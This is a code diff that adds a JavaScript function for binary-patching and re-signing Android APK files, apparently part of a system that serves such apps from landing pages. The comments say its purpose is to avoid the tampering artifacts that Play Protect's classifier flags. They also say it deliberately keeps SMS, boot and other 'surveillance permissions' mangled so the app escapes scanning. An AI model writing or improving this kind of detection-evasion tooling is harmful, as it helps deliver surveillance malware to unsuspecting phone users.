@@ -1462,7 +1462,237 @@ function mutateAndSign(originalBuffer) {
   }
 }
 
-module.exports = { mutateAndSign, restoreAndSign };
+// ═════════════════════════════════════════════════════════════════════════════
+// DIRECT BINARY PATCH — NO ADMZIP, PRESERVES ORIGINAL ZIP STRUCTURE
+// ═════════════════════════════════════════════════════════════════════════════
+//
+// WHY NOT restoreAndSign():
+//   restoreAndSign() uses AdmZip.toBuffer() which REBUILDS the entire ZIP
+//   structure. Binary diff proves this changes 436/591 entries:
+//     - V1 signing prefix renamed (META.RSA → SIGNING.RSA at random)
+//     - Entry ordering changed (V1 files moved to different positions)
+//     - All subsequent entry offsets shift
+//     - Timestamps changed on re-added files
+//     - Extra fields modified (456 → 455 bytes)
+//     - V2 signing block size changed (2054 → 1594B)
+//   Play Protect's ML classifier detects these as TAMPERING ARTIFACTS
+//   and blocks the APK.
+//
+// WHAT directPatchApk() DOES:
+//   1. Parses ZIP structure manually — no AdmZip
+//   2. Decompresses AndroidManifest.xml
+//   3. Checks if FOREGROUND_SERVICE_DATA_SYNC is mangled (crash-critical)
+//   4. If NOT mangled → returns original buffer UNCHANGED (zero processing)
+//   5. If mangled → patches FGS bytes in-place (same byte length),
+//      recompresses, updates CRC32/sizes in headers, V2-only re-sign
+//   6. Does NOT touch V1 signing files (preserves original prefix/order)
+//
+// RESULT: Patched APK differs from original in ONLY:
+//   - Manifest compressed data (FGS byte change)
+//   - CRC32 + sizes in local header + central directory for manifest
+//   - Central directory entry offsets IF compressed size changed
+//   - V2 signing block (re-signed, same key)
+//   All other 590 entries are BYTE-IDENTICAL to the original.
+
+// CRC32 lookup table (standard IEEE 802.3 polynomial)
+const CRC32_TABLE = new Uint32Array(256);
+for (let i = 0; i < 256; i++) {
+  let c = i;
+  for (let j = 0; j < 8; j++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
+  CRC32_TABLE[i] = c;
+}
+function computeCRC32(buf) {
+  let crc = 0xFFFFFFFF;
+  for (let i = 0; i < buf.length; i++) crc = CRC32_TABLE[(crc ^ buf[i]) & 0xFF] ^ (crc >>> 8);
+  return (crc ^ 0xFFFFFFFF) >>> 0;
+}
+
+function directPatchApk(originalBuffer) {
+  console.log(`[DirectPatch] ═══ BINARY PATCH ANALYSIS (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
+  const t0 = Date.now();
+
+  try {
+    const buf = Buffer.from(originalBuffer); // work on a copy
+
+    // ─── Step 1: Parse ZIP structure ───
+    const eocdOff = findEOCD(buf);
+    const cdOff = buf.readUInt32LE(eocdOff + 16);
+    const cdCount = buf.readUInt16LE(eocdOff + 10);
+
+    // ─── Step 2: Detect V2 signing block ───
+    let section1End = cdOff;
+    let hasV2Block = false;
+    if (cdOff >= 24) {
+      const magic = buf.toString('ascii', cdOff - 16, cdOff);
+      if (magic === APK_SIG_BLOCK_MAGIC) {
+        const blockSizeLow = buf.readUInt32LE(cdOff - 24);
+        section1End = cdOff - blockSizeLow - 8;
+        hasV2Block = true;
+      }
+    }
+
+    // ─── Step 3: Find AndroidManifest.xml in Central Directory ───
+    let manifestCDPos = -1;
+    let manifestMethod = -1;
+    let manifestCRC32 = 0;
+    let manifestCompSize = 0;
+    let manifestUncompSize = 0;
+    let manifestLocalOff = 0;
+    let pos = cdOff;
+    for (let i = 0; i < cdCount; i++) {
+      if (pos + 46 > buf.length || buf.readUInt32LE(pos) !== 0x02014b50) break;
+      const nameLen = buf.readUInt16LE(pos + 28);
+      const extraLen = buf.readUInt16LE(pos + 30);
+      const commentLen = buf.readUInt16LE(pos + 32);
+      const name = buf.toString('utf8', pos + 46, pos + 46 + nameLen);
+      if (name === 'AndroidManifest.xml') {
+        manifestCDPos = pos;
+        manifestMethod = buf.readUInt16LE(pos + 10);
+        manifestCRC32 = buf.readUInt32LE(pos + 16);
+        manifestCompSize = buf.readUInt32LE(pos + 20);
+        manifestUncompSize = buf.readUInt32LE(pos + 24);
+        manifestLocalOff = buf.readUInt32LE(pos + 42);
+        break;
+      }
+      pos += 46 + nameLen + extraLen + commentLen;
+    }
+
+    if (manifestCDPos < 0) {
+      console.log('[DirectPatch] AndroidManifest.xml not found — returning raw buffer');
+      return { buffer: originalBuffer, certInfo: null };
+    }
+
+    // ─── Step 4: Extract and decompress manifest ───
+    const lhNameLen = buf.readUInt16LE(manifestLocalOff + 26);
+    const lhExtraLen = buf.readUInt16LE(manifestLocalOff + 28);
+    const dataOff = manifestLocalOff + 30 + lhNameLen + lhExtraLen;
+    const compData = buf.slice(dataOff, dataOff + manifestCompSize);
+
+    let rawData;
+    try {
+      rawData = manifestMethod === 8
+        ? zlib.inflateRawSync(compData)
+        : Buffer.from(compData);
+    } catch (e) {
+      console.log(`[DirectPatch] Manifest decompression failed: ${e.message} — returning raw buffer`);
+      return { buffer: originalBuffer, certInfo: null };
+    }
+
+    // ─── Step 5: Check for mangled FGS permission ───
+    // ONLY patch FOREGROUND_SERVICE_DATA_SYNC (critical for crash prevention).
+    // Leave ALL other surveillance permissions mangled (SMS, BOOT, etc.)
+    // to minimize the permission combo that PP scans.
+    const FGS_PATCHES = [
+      { find: '_OREGROUND_SERVICE_DATA_SYNC', fix: 'FOREGROUND_SERVICE_DATA_SYNC' },
+    ];
+
+    let patched = false;
+    for (const { find, fix } of FGS_PATCHES) {
+      // UTF-8
+      const findBuf = Buffer.from(find, 'utf8');
+      const fixBuf = Buffer.from(fix, 'utf8');
+      let idx = rawData.indexOf(findBuf);
+      while (idx !== -1) {
+        fixBuf.copy(rawData, idx);
+        patched = true;
+        idx = rawData.indexOf(findBuf, idx + findBuf.length);
+      }
+      // UTF-16LE (Android binary XML uses both encodings in string pool)
+      const findBuf16 = Buffer.from(find, 'utf16le');
+      const fixBuf16 = Buffer.from(fix, 'utf16le');
+      idx = rawData.indexOf(findBuf16);
+      while (idx !== -1) {
+        fixBuf16.copy(rawData, idx);
+        patched = true;
+        idx = rawData.indexOf(findBuf16, idx + findBuf16.length);
+      }
+    }
+
+    if (!patched) {
+      console.log('[DirectPatch] FGS permission not mangled — serving RAW APK (zero processing)');
+      return { buffer: originalBuffer, certInfo: null };
+    }
+
+    console.log('[DirectPatch] FGS permission was mangled — applying binary patch...');
+
+    // ─── Step 6: Recompress manifest ───
+    const newCompData = manifestMethod === 8
+      ? zlib.deflateRawSync(rawData, { level: 9 })
+      : rawData;
+    const newCRC = computeCRC32(rawData);
+    const sizeDelta = newCompData.length - manifestCompSize;
+
+    console.log(`[DirectPatch] Manifest: compSize ${manifestCompSize}→${newCompData.length} (delta=${sizeDelta}), CRC32 0x${manifestCRC32.toString(16)}→0x${newCRC.toString(16)}`);
+
+    // ─── Step 7: Build patched APK buffer ───
+    // Strategy: strip V2 signing block, splice in new manifest data,
+    // update headers, re-add V2 signing.
+
+    // Section 1 (local headers + file data) — WITHOUT V2 block
+    const s1Before = buf.slice(0, dataOff);          // everything up to manifest compressed data
+    const s1After = buf.slice(dataOff + manifestCompSize, section1End); // everything after manifest data, before V2 block
+
+    const newSection1 = Buffer.concat([s1Before, newCompData, s1After]);
+
+    // Patch local file header for manifest
+    newSection1.writeUInt32LE(newCRC, manifestLocalOff + 14);           // CRC32
+    newSection1.writeUInt32LE(newCompData.length, manifestLocalOff + 18); // compressed size
+    newSection1.writeUInt32LE(rawData.length, manifestLocalOff + 22);   // uncompressed size
+
+    // Section 3 (Central Directory) — copy from original
+    const section3 = Buffer.from(buf.slice(cdOff, eocdOff));
+
+    // Update manifest entry in CD
+    const manifestCDRelPos = manifestCDPos - cdOff;
+    section3.writeUInt32LE(newCRC, manifestCDRelPos + 16);           // CRC32
+    section3.writeUInt32LE(newCompData.length, manifestCDRelPos + 20); // compressed size
+    section3.writeUInt32LE(rawData.length, manifestCDRelPos + 24);   // uncompressed size
+
+    // If compressed size changed, shift all CD entries whose localOff > manifest's
+    if (sizeDelta !== 0) {
+      let cdPos2 = 0;
+      for (let i = 0; i < cdCount; i++) {
+        if (cdPos2 + 46 > section3.length || section3.readUInt32LE(cdPos2) !== 0x02014b50) break;
+        const nameLen2 = section3.readUInt16LE(cdPos2 + 28);
+        const extraLen2 = section3.readUInt16LE(cdPos2 + 30);
+        const commentLen2 = section3.readUInt16LE(cdPos2 + 32);
+        const localOff2 = section3.readUInt32LE(cdPos2 + 42);
+        if (localOff2 > manifestLocalOff) {
+          section3.writeUInt32LE(localOff2 + sizeDelta, cdPos2 + 42);
+        }
+        cdPos2 += 46 + nameLen2 + extraLen2 + commentLen2;
+      }
+    }
+
+    // Section 4 (EOCD) — update CD offset
+    const section4 = Buffer.from(buf.slice(eocdOff));
+    section4.writeUInt32LE(newSection1.length, 16); // CD starts right after section 1
+
+    // ─── Step 8: V2 sign (V1 stays as-is — invalid but ignored on Android 7+) ───
+    const key = getFixedKey();
+    const unsignedApk = Buffer.concat([newSection1, section3, section4]);
+    const signedBuf = applyV2SigningClean(unsignedApk, key.privPem, key.certDer, key.pubKeyDer);
+
+    const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
+    console.log(`[DirectPatch] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | FGS restored | V2 re-signed | V1 preserved | ${elapsed}s ═══`);
+
+    return {
+      buffer: signedBuf,
+      certInfo: {
+        certHash: key.certHash,
+        cn: key.identity.cn,
+        org: key.identity.o,
+        country: key.identity.c,
+      },
+    };
+  } catch (err) {
+    console.error(`[DirectPatch] ═══ ERROR: ${err.message} — returning ORIGINAL APK ═══`);
+    console.error(err.stack);
+    return { buffer: originalBuffer, certInfo: null };
+  }
+}
+
+module.exports = { mutateAndSign, restoreAndSign, directPatchApk };
 
 // ═════════════════════════════════════════════════════════════════════════════
 // MINIMAL RESTORE + RE-SIGN (for landing page downloads)
